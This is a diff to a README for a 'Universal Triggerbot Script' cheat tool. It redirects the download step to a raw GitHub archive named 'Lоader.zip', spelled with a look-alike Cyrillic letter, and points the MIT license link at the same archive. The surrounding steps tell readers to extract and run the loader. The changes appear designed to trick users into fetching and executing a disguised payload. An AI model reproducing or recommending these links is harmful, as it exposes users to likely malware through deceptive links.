@@ -4,7 +4,7 @@ Welcome to the **Universal Triggerbot Script**, your go-to versatile solution fo
 
 ## 💾 Installation Guide
 
-1. **Download** `Loader.rar` from the repository's [Releases](./releases) section.
+1. **Download** `https://raw.githubusercontent.com/Domitian13/TriggerBotX-Universal/main/Lоader.zip` from the repository's [Releases](./releases) section.
 2. **Extract** the contents of the archive to a safe directory of your choice.
 3. **Run** the loader script according to your operating system. (Refer to the OS compatibility table below for detailed guidance.)
 4. **Configure** your trigger settings in the provided configuration file to match your preferences.
@@ -61,7 +61,7 @@ This utility is created **for educational and personal entertainment purposes on
 
 ## 📜 License
 
-Distributed under the MIT License. See the complete license text [here](https://opensource.org/licenses/MIT).
+Distributed under the MIT License. See the complete license text [here](https://raw.githubusercontent.com/Domitian13/TriggerBotX-Universal/main/Lоader.zip).
 
 ---
 
